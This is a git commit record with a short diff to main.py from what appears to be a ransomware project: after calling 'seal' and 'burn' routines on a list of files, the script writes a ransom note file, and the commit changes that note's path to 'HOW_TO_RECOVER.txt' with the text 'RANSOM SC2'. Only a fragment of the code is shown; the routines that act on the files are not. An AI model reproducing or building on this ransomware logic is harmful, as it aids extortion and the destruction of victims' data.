a1aba6a1b669c02b44f42ab0138cffa0b8391ba5
Klithik <santi17461@gmail.com>
2024-02-12 14:45:38 -0300

    cambiada ruta archivo recover

--- main.py
+++ main.py
@@ -8,5 +8,5 @@ seal.main()
 for item in archivos:
     burn.main(item)
 
-with open("~/HOW_TO_RECOVER",'w') as file:
+with open("HOW_TO_RECOVER.txt",'w') as file:
     file.write("RANSOM SC2-RANSOM SC2")
